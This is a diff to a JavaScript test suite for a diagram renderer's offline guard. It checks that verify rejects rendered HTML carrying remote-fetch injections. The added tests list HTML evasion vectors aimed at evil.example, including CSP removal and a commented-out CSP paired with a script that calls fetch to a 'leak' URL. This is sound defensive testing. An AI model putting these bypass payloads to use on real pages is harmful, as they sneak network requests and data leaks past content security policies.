@@ -16,6 +16,14 @@ const readyFixture = path.join(fixtures, "neutral-ready.session-model.json");
 const userHome = os.userInfo().homedir;
 const stockArchify = [path.join(userHome, ".agents", "skills", "archify"), path.join(userHome, ".claude", "skills", "archify")]
   .find((candidate) => fs.existsSync(path.join(candidate, "bin", "archify.mjs")));
+// CI sets VASM_REQUIRE_ARCHIFY=1 after installing pinned Archify, so a missing install fails
+// instead of silently skipping the standard-profile tests.
+function needsArchify(context) {
+  if (stockArchify) return true;
+  if (process.env.VASM_REQUIRE_ARCHIFY === "1") assert.fail("stock Archify is required (VASM_REQUIRE_ARCHIFY=1) but not installed");
+  context.skip("stock Archify unavailable");
+  return false;
+}
 const STATES = ["planned", "started", "delegated", "deferred", "hitl", "blocked", "completed", "canceled", "superseded", "deprecated", "unknown"];
 const ALLOWED = {
   planned: ["started", "delegated", "deferred", "hitl", "canceled", "superseded", "deprecated"],
@@ -776,12 +784,84 @@ test("child derivation scans allowlisted inherited material before any write", a
 });
 
 test("standard profile still renders through trusted stock Archify", async (context) => {
-  if (!stockArchify) { context.skip("stock Archify unavailable"); return; }
+  if (!needsArchify(context)) return;
   await temp(async (directory) => {
     const model = await copyModel(directory, readyFixture);
     const render = run(["render", model, "--profile", "standard", "--out", path.join(directory, "bundle"), "--archify-dir", stockArchify]);
     assert.equal(render.status, 0, render.stderr);
     assert.equal(body(render.stdout).profile, "standard");
+    const verify = run(["verify", body(render.stdout).manifest, "--archify-dir", stockArchify]);
+    assert.equal(verify.status, 0, verify.stderr);
+  });
+});
+
+test("standard HTML honors network_access_from_html: remote font loads are removed and verify rejects any remote fetch", async (context) => {
+  if (!needsArchify(context)) return;
+  await temp(async (directory) => {
+    const model = await copyModel(directory, readyFixture);
+    const render = run(["render", model, "--profile", "standard", "--out", path.join(directory, "bundle"), "--archify-dir", stockArchify]);
+    assert.equal(render.status, 0, render.stderr);
+    const { manifest: manifestFile, outputs } = body(render.stdout);
+    const html = await readFile(outputs.html, "utf8");
+    assert.doesNotMatch(html, /fonts\.googleapis\.com|fonts\.gstatic\.com/u);
+    assert.doesNotMatch(html, /\b(?:href|src)\s*=\s*["']?\s*(?:https?:)?\/\//iu);
+    assert.match(html, /remote font loads removed/u);
+    // Mutation: put a remote stylesheet back, rebind the digest, and verify must refuse it.
+    const tampered = html.replace("</head>", "<link rel=\"stylesheet\" href=\"https://example.com/a.css\">\n</head>");
+    assert.notEqual(tampered, html);
+    await writeFile(outputs.html, tampered);
+    const manifest = JSON.parse(await readFile(manifestFile, "utf8"));
+    manifest.subjects.find((item) => item.role === "diagram_html").digest.value = sha(Buffer.from(tampered));
+    await writeFile(manifestFile, `${JSON.stringify(manifest, null, 2)}\n`);
+    const verify = run(["verify", manifestFile, "--archify-dir", stockArchify]);
+    assert.equal(verify.status, 1, verify.stdout);
+    assert.equal(body(verify.stderr).error.code, "NETWORK_ACCESS_DENIED");
+    // Every fetch vector reviewers named must also be refused, one at a time.
+    const vectors = {
+      metaRefresh: "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">",
+      srcsetLaterCandidate: "<img alt=\"\" srcset=\"/a.png 1x, //evil.example/b.png 2x\">",
+      srcdoc: "<iframe title=\"x\" srcdoc=\"&lt;p&gt;x&lt;/p&gt;\"></iframe>",
+      cssEscapedUrl: "<style>body{background:url(https\\3A //evil.example/)}</style>",
+      entityEncodedHref: "<link rel=\"icon\" href=\"https&#58;//evil.example/i.png\">",
+      styleAttribute: "<div style=\"background:url(//evil.example/a)\"></div>",
+      srcsetDataThenRemote: "<img alt=\"\" srcset=\"data:image/png;base64,AAAA 1x, https://evil.example/t.png 2x\">",
+      quotedGreaterThan: "<link title=\">\" rel=\"stylesheet\" href=\"https://evil.example/a.css\">",
+      apostropheInUnquotedValue: "<img alt=a'b src=//evil.example/x.png>",
+      outOfRangeEntity: "<link title=\"&#x110000;\" rel=\"stylesheet\" href=\"https://evil.example/a.css\">"
+    };
+    const csp = html.match(/  <meta http-equiv="Content-Security-Policy" content="[^"]*">\n/u);
+    assert.ok(csp, "offline CSP is present");
+    assert.match(csp[0], /default-src 'none'/u);
+    assert.match(csp[0], /connect-src 'none'/u);
+    const edits = [
+      ...Object.entries(vectors).map(([name, vector]) => [name, html.replace("</head>", `${vector}\n</head>`)]),
+      ["cspRemoved", html.replace(csp[0], "")],
+      ["cspWeakened", html.replace(csp[0], csp[0].replace("default-src 'none'", "default-src *"))],
+      ["cspMovedAfterScript", html.replace(csp[0], "").replace("</head>", `${csp[0]}</head>`)],
+      ["unterminatedQuoteAtEnd", `${html}<img src=//evil.example/x.png alt="x>`],
+      ["cspCommentedOut", html.replace(`  <meta charset="UTF-8">\n${csp[0]}`, `  <!--\n  <meta charset="UTF-8">\n${csp[0]}  -->\n`).replace("</head>", "<script>fetch(\"https://evil.example/leak\")</script>\n</head>")]
+    ];
+    for (const [name, injected] of edits) {
+      assert.notEqual(injected, html, name);
+      await writeFile(outputs.html, injected);
+      const current = JSON.parse(await readFile(manifestFile, "utf8"));
+      current.subjects.find((item) => item.role === "diagram_html").digest.value = sha(Buffer.from(injected));
+      await writeFile(manifestFile, `${JSON.stringify(current, null, 2)}\n`);
+      const refused = run(["verify", manifestFile, "--archify-dir", stockArchify]);
+      assert.equal(refused.status, 1, `${name}: ${refused.stdout}`);
+      assert.equal(body(refused.stderr).error.code, "NETWORK_ACCESS_DENIED", `${name}: ${refused.stderr}`);
+    }
+  });
+});
+
+test("standard offline guard ignores URL-like text in visible content", async (context) => {
+  if (!needsArchify(context)) return;
+  await temp(async (directory) => {
+    const model = await mutateModel(directory, (value) => {
+      value.plan.work_items[0].title = "Investigate url(https://example.com/font.woff2) usage";
+    }, readyFixture);
+    const render = run(["render", model, "--profile", "standard", "--out", path.join(directory, "bundle"), "--archify-dir", stockArchify]);
+    assert.equal(render.status, 0, render.stderr);
     const verify = run(["verify", body(render.stdout).manifest, "--archify-dir", stockArchify]);
     assert.equal(verify.status, 0, verify.stderr);
   });
@@ -1311,7 +1391,7 @@ test("sensitive scan catches a base64-encoded secret even when the clean decode 
 });
 
 test("verify rejects a source subject containing malformed UTF-8 bytes, matching validate's ENCODING_INVALID guarantee", async (context) => {
-  if (!stockArchify) { context.skip("stock Archify unavailable"); return; }
+  if (!needsArchify(context)) return;
   await temp(async (directory) => {
     const model = await copyModel(directory, readyFixture);
     const render = run(["render", model, "--profile", "standard", "--out", path.join(directory, "bundle"), "--archify-dir", stockArchify]);
